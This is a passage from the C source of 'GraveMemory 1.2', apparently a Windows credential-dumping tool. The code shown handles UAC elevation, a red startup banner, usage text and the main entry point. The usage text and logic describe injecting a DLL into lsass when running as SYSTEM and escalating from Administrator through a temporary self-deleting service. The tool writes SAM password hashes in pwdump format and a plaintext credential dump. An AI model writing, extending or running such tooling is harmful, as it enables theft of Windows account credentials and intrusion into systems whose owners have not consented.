    _snwprintf(params, MAX_PATH * 2 + 60, L"--out \"%s\"", outdir);
    params[(MAX_PATH * 2 + 60) - 1] = 0;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = selfExe;
    sei.lpParameters = params;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei)) {
        printf("ERROR: UAC elevation declined (err=%lu)\n", GetLastError());
        printf("Run this tool from an elevated (Administrator) prompt,\n"
               "or accept the UAC prompt.\n");
        return 2;
    }
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, (DWORD)g_waitSeconds * 1000 + 15000);
        CloseHandle(sei.hProcess);
    }
    /* elevated child produced the files - report */
    if (WaitForResultFile(outdir, resultBuf, sizeof(resultBuf), NULL) == 0) {
        printf("[+] dump complete: %s\n", resultBuf);
        return 0;
    }
    printf("[-] dump did not complete: %s\n",
           resultBuf[0] ? resultBuf : "(no result file)");
    GM_JoinPath(outdir, GM_LOG_NAME, logPath, MAX_PATH + 1);
    PrintTail(logPath);
    return 1;
}

/* ================================================================== */
/* GraveMemory startup banner (v1.2)                                  */
/* ================================================================== */

/*
 * Red ASCII banner, printed on EVERY launch (normal run, --help,
 * UAC relaunch). The art is pure UTF-8 block elements; it is stored
 * verbatim in the binary. Colour is applied with
 * SetConsoleTextAttribute() so it works on classic conhost (XP+)
 * and on Windows Terminal alike. When stdout is redirected to a
 * file/pipe the colour call is skipped and only the plain art is
 * written. The console's ORIGINAL attributes are restored after the
 * banner so the rest of the output keeps the user's colours.
 *
 * NOTE: wmain() switches the console to UTF-8 (codepage 65001)
 * BEFORE calling this function - that is what makes the block
 * elements render correctly.
 */
static const char *GM_BANNER =
    "\n"
    "\n"
    "  ▄████     ██▀███      ▄▄▄          ██▒   █▓   ▓█████                 \n"
    " ██▒ ▀█▒   ▓██ ▒ ██▒   ▒████▄       ▓██░   █▒   ▓█   ▀                 \n"
    "▒██░▄▄▄░   ▓██ ░▄█ ▒   ▒██  ▀█▄      ▓██  █▒░   ▒███                   \n"
    "░▓█  ██▓   ▒██▀▀█▄     ░██▄▄▄▄██      ▒██ █░░   ▒▓█  ▄                 \n"
    "░▒▓███▀▒   ░██▓ ▒██▒    ▓█   ▓██▒      ▒▀█░     ░▒████▒                \n"
    " ░▒   ▒    ░ ▒▓ ░▒▓░    ▒▒   ▓▒█░      ░ ▐░     ░░ ▒░ ░                \n"
    "  ░   ░      ░▒ ░ ▒░     ▒   ▒▒ ░      ░ ░░      ░ ░  ░                \n"
    "░ ░   ░      ░░   ░      ░   ▒           ░░        ░                   \n"
    "      ░       ░              ░  ░         ░        ░  ░                \n"
    "                                         ░                             \n"
    " ███▄ ▄███▓   ▓█████     ███▄ ▄███▓    ▒█████      ██▀███     ▓██   ██▓\n"
    "▓██▒▀█▀ ██▒   ▓█   ▀    ▓██▒▀█▀ ██▒   ▒██▒  ██▒   ▓██ ▒ ██▒    ▒██  ██▒\n"
    "▓██    ▓██░   ▒███      ▓██    ▓██░   ▒██░  ██▒   ▓██ ░▄█ ▒     ▒██ ██░\n"
    "▒██    ▒██    ▒▓█  ▄    ▒██    ▒██    ▒██   ██░   ▒██▀▀█▄       ░ ▐██▓░\n"
    "▒██▒   ░██▒   ░▒████▒   ▒██▒   ░██▒   ░ ████▓▒░   ░██▓ ▒██▒     ░ ██▒▓░\n"
    "░ ▒░   ░  ░   ░░ ▒░ ░   ░ ▒░   ░  ░   ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░      ██▒▒▒ \n"
    "░  ░      ░    ░ ░  ░   ░  ░      ░     ░ ▒ ▒░      ░▒ ░ ▒░    ▓██ ░▒░ \n"
    "░      ░         ░      ░      ░      ░ ░ ░ ▒       ░░   ░     ▒ ▒ ░░  \n"
    "       ░         ░  ░          ░          ░ ░        ░         ░ ░     \n"
    "                                                               ░ ░     \n"
    "\n";

static void PrintBanner(void)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO info;

    /* bright red, like "Fore.RED + Style.BRIGHT" */
    WORD red = FOREGROUND_RED | FOREGROUND_INTENSITY;

    if (hOut != INVALID_HANDLE_VALUE &&
        GetConsoleScreenBufferInfo(hOut, &info)) {
        /* real console: paint the banner red, then restore the
         * exact original colours */
        SetConsoleTextAttribute(hOut, red);
        printf("%s", GM_BANNER);
        SetConsoleTextAttribute(hOut, info.wAttributes);
    } else {
        /* stdout redirected (file / pipe / service): plain text */
        printf("%s", GM_BANNER);
    }
}

/* ================================================================== */

static void PrintUsage(void)
{
    printf(
        "GraveMemory 1.2 - GraveMemory-compatible SAM dumper, NO encryption\n"
        "\n"
        "Usage:\n"
        "  gravememory.exe [--out <folder>] [--wait <seconds>]\n"
        "  gravememory.exe --svc <folder> --svcname <name>   (internal)\n"
        "\n"
        "Behaviour (identical to the GraveMemory agent):\n"
        "  - running as SYSTEM    : injects the dump DLL into lsass\n"
        "  - running as admin     : creates a temporary service to re-run\n"
        "                           itself as SYSTEM, then cleans it up\n"
        "  - unprivileged         : asks for UAC elevation first\n"
        "\n"
        "Files required next to the exe:\n"
        "  gravememorydll64.dll   (64-bit Windows)\n"
        "  gravememorydll32.dll   (32-bit Windows)\n"
        "\n"
        "Outputs (default folder = current directory):\n"
        "  gravememory.dmp           plaintext record stream (GM-compatible) \n"
        "  gravememory.dmp.status    12-byte status [total][processed][finished]\n"
        "  gravememory.dmp.result    one-line ANSI result\n"
        "  gravememory.dmp.log       step-by-step diagnostic log\n"
        "  gravememory.json          JSON report\n"
        "  hashes.txt               pwdump-style user:RID:LM:NT:::\n"
        "\n"
        "Parse with:  python3 gm_dump_parser.py <folder>\\gravememory.dmp\n"
        "             (auto-detects plaintext dumps; --plain forces it)\n");
}

static void MakeAbsolutePath(const wchar_t *in, wchar_t *out, DWORD outCap)
{
    wchar_t *filePart = NULL;
    DWORD n = GetFullPathNameW(in, outCap, out, &filePart);
    (void)filePart;
    if (n == 0 || n > outCap)
        _snwprintf(out, outCap - 1, L"%s", in);
    out[outCap - 1] = 0;
}

/* ================================================================== */
/* entry point                                                        */
/* ================================================================== */

int wmain(int argc, wchar_t **argv)
{
    wchar_t outdir[MAX_PATH + 1];
    wchar_t outdirAbs[MAX_PATH + 1];
    int i, rc;
    int haveOut = 0, svcRun = 0;

    /* console should show UTF-8 output (banner art + reports) */
    SetConsoleOutputCP(65001);

    /* v1.2: print the red GraveMemory banner on every launch,
     * BEFORE anything else (even --help) */
    PrintBanner();

    GetModuleFileNameW(NULL, g_selfExe, MAX_PATH);
    g_selfExe[MAX_PATH] = 0;

    for (i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--out") == 0 && i + 1 < argc) {
            _snwprintf(outdir, MAX_PATH, L"%s", argv[++i]);
            outdir[MAX_PATH] = 0;
            haveOut = 1;
        } else if (wcscmp(argv[i], L"--svc") == 0 && i + 1 < argc) {
            _snwprintf(g_svcOutDir, MAX_PATH, L"%s", argv[++i]);
            g_svcOutDir[MAX_PATH] = 0;
            svcRun = 1;
        } else if (wcscmp(argv[i], L"--svcname") == 0 && i + 1 < argc) {
            _snwprintf(g_svcName, 128, L"%s", argv[++i]);
            g_svcName[127] = 0;
        } else if (wcscmp(argv[i], L"--wait") == 0 && i + 1 < argc) {
            g_waitSeconds = _wtoi(argv[++i]);
            if (g_waitSeconds <= 0)
                g_waitSeconds = 300;
        } else if (wcscmp(argv[i], L"--help") == 0 ||
                   wcscmp(argv[i], L"-h") == 0) {
            PrintUsage();
            return 0;
        }
    }

    /* ---- internal service mode ---- */
    if (svcRun) {
        wchar_t absDir[MAX_PATH + 1];
        if (!g_svcName[0])
            _snwprintf(g_svcName, 128, L"GraveMemory");
        g_svcName[127] = 0;
        MakeAbsolutePath(g_svcOutDir, absDir, MAX_PATH);
        _snwprintf(g_svcOutDir, MAX_PATH, L"%s", absDir);
        g_svcOutDir[MAX_PATH] = 0;
        g_serviceMode = 1;
        return RunAsService();
    }

    if (!haveOut)
        GetCurrentDirectoryW(MAX_PATH, outdir);
    MakeAbsolutePath(outdir, outdirAbs, MAX_PATH);

    /* UTF-8 codepage was already switched on at wmain start (needed
     * for the banner); nothing more to do here. */

    if (IsLocalSystem()) {
        printf("[*] running as SYSTEM - injecting into lsass directly\n");
        rc = RunElevatedDump(outdirAbs);
        return rc;
    }

    if (IsAdmin()) {
        printf("[*] running as Administrator - elevating via temporary service\n");
        rc = ElevateViaService(g_selfExe, outdirAbs);
        if (rc == 0) {
            /* print the friendly pwdump output */
            wchar_t txtPath[MAX_PATH + 1];
            GM_JoinPath(outdirAbs, GM_TXT_NAME, txtPath, MAX_PATH + 1);
            CatFile(txtPath);
        }
        return rc;
    }

    printf("[*] not elevated - trying UAC elevation...\n");
    return TryUacElevation(g_selfExe, outdirAbs);
}
